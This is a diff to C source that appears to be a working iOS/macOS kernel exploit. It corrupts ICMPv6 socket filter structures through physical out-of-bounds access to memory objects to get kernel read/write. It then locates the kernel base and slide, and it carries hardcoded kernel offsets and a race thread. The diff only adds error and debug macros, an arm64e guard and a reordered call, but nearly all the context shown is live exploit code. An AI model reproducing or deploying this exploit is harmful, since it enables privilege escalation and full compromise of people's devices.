@@ -12,6 +12,9 @@
 #include <sys/uio.h>
 void IOSurfacePrefetchPages(IOSurfaceRef surface);
 
+#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}
+#define PRINT_VAR(var) {printf(#var ": %#llx\n", var); fflush(stdout); sleep(2);}
+
 #define OFFSET_PCB_SOCKET 0x40
 #define OFFSET_SOCKET_SO_COUNT 0x228
 #define OFFSET_ICMP6FILT (0x138 + 0x18)
@@ -22,11 +25,15 @@ void IOSurfacePrefetchPages(IOSurfaceRef surface);
 #define OOB_SIZE 0xf00
 #define OOB_PAGES_NUM 2
 
+#ifdef __arm64e__
 static uint64_t __attribute((naked)) __xpaci(uint64_t a)
 {
     asm(".long        0xDAC143E0"); // XPACI X0
     asm("ret");
 }
+#else
+#define __xpaci(x) x
+#endif
 
 void memset64(void *ptr, uint64_t val, size_t size)
 {
@@ -81,7 +88,7 @@ void setTargetKaddr(uint64_t where)
 	int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
 	if (res != 0) {
 		printf("[-] setsockopt failed!!!\n");
-		exit(0);
+		FAILURE(0);
 	}
 }
 
@@ -164,7 +171,7 @@ void *free_thread(void *arg)
 			printf("[-] mach_vm_map failed !!!\n");
             printf("[+] freeTarget: %#llx\n", freeTarget);
             printf("[+] targetObject: %#x\n", targetObject);
-			exit(0);
+			FAILURE(0);
 		}
 
 		raceSync = 0;
@@ -259,7 +266,7 @@ void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *
 
 	if (!surface) {
 		printf("[-] Failed to create surface!!!\n");
-		exit(0);
+		FAILURE(0);
 	}
 
 	void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
@@ -269,7 +276,7 @@ void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *
 	kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
 	if (!surface) {
 		printf("[-] mach_make_memory_entry_64 failed!!!\n");
-		exit(0);
+		FAILURE(0);
 	}
 
 	mach_vm_address_t newMappingAddress;
@@ -277,7 +284,7 @@ void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *
 
 	if (kr != KERN_SUCCESS) {
 		printf("[-] mach_vm_map failed!!!\n");
-		exit(0);
+		FAILURE(0);
 	}
 
 	CFRelease(surface);
@@ -327,7 +334,7 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t me
 									   VM_INHERIT_NONE);
 		if (kr != KERN_SUCCESS) {
 			printf("[+] mach_vm_map failed!!!\n");
-			exit(0);
+			FAILURE(0);
 		}
 		if (w == -1) {
 			int r = pread(readFd, buffer, size, 0x3f00 + offset);
@@ -387,7 +394,7 @@ void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObje
 						 
 		if (kr != KERN_SUCCESS) {
 			printf("[-] mach_vm_map failed!!!\n");
-			exit(0);
+			FAILURE(0);
 		}
 	}
 	targetObject = 0;
@@ -400,7 +407,7 @@ void set_target_kaddr(uint64_t where)
 	int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
 	if (res != 0) {
 		printf("[-] setsockopt failed!!!");
-		exit(0);
+		FAILURE(0);
 	}
 }
 
@@ -408,14 +415,14 @@ void early_kread(uint64_t where, void *read_buf, size_t size)
 {
 	if (size > EARLY_KRW_LENGTH) {
       printf("[!] error: (size > EARLY_KRW_LENGTH)\n");
-      exit(0);
+      FAILURE(0);
     }
     set_target_kaddr(where);
     socklen_t read_data_length = size;
     int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
     if (res != 0) {
-      printf("[-] getsockopt failed!!!\n");
-      exit(0);
+		printf("[-] getsockopt failed!!!\n");
+		FAILURE(0);
     }
 }
 
@@ -432,7 +439,7 @@ void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH])
 	int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);
 	if (res != 0) {
 		printf("[-] setsockopt failed!!!");
-		exit(0);
+		FAILURE(0);
 	}
 }
 
@@ -517,7 +524,7 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);
 		if (res != 0) {
 			printf("[-] getsockopt failed!!!\n");
-			exit(0);
+			FAILURE(0);
 		}
 		uint64_t marker = *(uint64_t *)getsockoptReadData;
 		if (marker != -1) {
@@ -571,7 +578,7 @@ void pe_v1(void)
 			kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
 			if (kr != KERN_SUCCESS) {
 				printf("[-] mach_vm_allocate failed!!!\n");
-				exit(0);
+				FAILURE(0);
 			}
 			for (int k = 0; k < searchMappingSize; k += PAGE_SIZE) {
 				*(uint64_t *)(searchMappingAddress + k) = randomMarker;
@@ -607,7 +614,7 @@ void pe_v1(void)
 			kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
 			if (kr != KERN_SUCCESS) {
 				printf("[-] mach_make_memory_entry_64 failed!!!");
-				exit(0);
+				FAILURE(0);
 			}
 			surface_mlock(searchMappingAddress, searchMappingSize);
 			mach_vm_offset_t seekingOffset = 0;
@@ -624,7 +631,7 @@ void pe_v1(void)
 			kr = mach_port_deallocate(mach_task_self(), memoryObject);
 			if (kr != KERN_SUCCESS) {
 				printf("[-] mach_port_deallocate failed!!!\n");
-				exit(0);
+				FAILURE(0);
 			}
 			if (success == true) {
 				break;
@@ -657,7 +664,7 @@ void krw_sockets_leak_forever(void)
 
 	if (!controlSocketAddr || !rwSocketAddr) {
 		printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
-		exit(0);
+		FAILURE(0);
 	}
 
 	uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
@@ -701,12 +708,18 @@ int main(int argc, char* argv[])
 	close(readFd); 
 
 	controlSocketPcb = early_kread64(rwSocketPcb + 0x20);
+	krw_sockets_leak_forever();
+
 	uint64_t socketPtr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET); // inpcb->socket
+	//PRINT_VAR(socketPtr);
 	uint64_t protoPtr = early_kread64(socketPtr + OFFSET_SO_PROTO); // socket->so_proto
+	//PRINT_VAR(protoPtr);
 	uint64_t textPtr = __xpaci(early_kread64(protoPtr + OFFSET_PR_INPUT)); // protosw->pr_input
+	//PRINT_VAR(textPtr);
 
     kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
     while (true) {
+		//PRINT_VAR(kernel_base);
 		if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
 			if (@available(iOS 16.0, *)) {
 				if (early_kread64(kernel_base + 0x8) == 0xc00000002) {
@@ -722,8 +735,6 @@ int main(int argc, char* argv[])
     kernel_slide = kernel_base - 0xfffffff007004000;
 
 	printf("early_kread64(%#llx) -> %#llx\n", kernel_base, early_kread64(kernel_base));
-
-    krw_sockets_leak_forever();
 
 	printf("win??\n");
 	fflush(stdout); sleep(1);
